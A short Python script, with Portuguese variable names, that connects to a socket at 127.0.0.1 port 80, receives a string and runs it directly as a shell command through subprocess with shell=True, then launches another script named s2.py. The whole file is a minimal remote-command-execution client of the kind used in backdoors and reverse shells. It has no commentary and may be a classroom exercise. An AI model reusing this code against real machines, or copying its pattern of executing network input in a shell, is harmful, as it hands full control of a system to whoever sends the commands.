import socket 
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = "127.0.0.1" 
porta = 80

s.connect((host,porta))
dados = s.recv(1024)
print(dados.decode('ascii'))
comando = subprocess.call(dados.decode('ascii'), shell=True)
n = subprocess.call("python3 s2.py", shell=True)
